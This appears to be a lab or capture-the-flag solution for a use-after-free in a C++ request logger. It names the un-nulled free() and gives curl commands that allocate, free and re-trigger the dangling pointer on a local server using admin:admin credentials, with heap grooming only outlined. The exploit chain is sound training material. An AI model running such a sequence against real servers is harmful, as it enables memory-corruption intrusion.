# Solution — 08 · Use-After-Free (Logger)

**Code**: `request_logger.cpp` → `free(current_log_format);` without nulling.

```bash
# 1. Allocate the 72-byte LogFormat.
curl -u admin:admin "http://127.0.0.1:8081/admin/logger_config?action=set&format=AAAA"

# 2. Free without nulling the dangling pointer.
curl -u admin:admin "http://127.0.0.1:8081/admin/logger_config?action=reset"

# 3. Groom the heap so the freed chunk is reallocated with attacker data.
#    (challenge 09's system_status is a convenient 32-byte primitive;
#     iterate a few times to hit the 72-byte size class.)

# 4. Trigger the logger on any subsequent request.
curl "http://127.0.0.1:8081/"
```
